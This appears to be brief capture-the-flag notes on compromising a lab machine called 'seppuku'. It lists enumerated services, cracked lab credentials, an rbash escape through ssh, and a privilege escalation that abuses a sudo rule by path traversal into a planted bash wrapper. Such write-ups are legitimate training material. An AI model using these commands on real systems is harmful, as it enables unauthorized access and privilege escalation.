# Enumeration

## SMB on ports 139/445

- Service information

	`Samba smbd 4.9.5-Debian`

## Web server on port 80

- Service information

	`nginx 1.14.2`

- Requires authorization with http-get

## Web server on port 8088

- Service information

	`OpenLiteSpeed Web Server 1.6`

## Web server on port 7601

- Found backup files in `/secret`

- Found username 

	`rabbit-hole`

- Found list of passwords

- Cracked password

	`rabbit-hole:a1b2c3`

- Found another username

	`seppuku`

- Found ssh key in `/keys`

# RCE

## seppuku

- Cracked SSH credentials

	`seppuku:eeyoree`

- Escaped `rbash` with 

	`ssh seppuku@seppuku -t "bash --noprofile`

## samurai

- Found credentials in `/home/seppuku/.passwd`

	`samurai:12345685213456!@!@A`

## tanto

- Could use SSH key to login as `tanto`

# PrivEsc

- Create file as `tanto`

	```
	mkdir /home/tanto/.cgi_bin
	echo '/bin/bash' > /home/tanto/.cgi_bin/bin
	chmod +x /home/tanto/.cgi_bin/bin
	```

- Could run command with sudo as `samurai`

	`sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*`
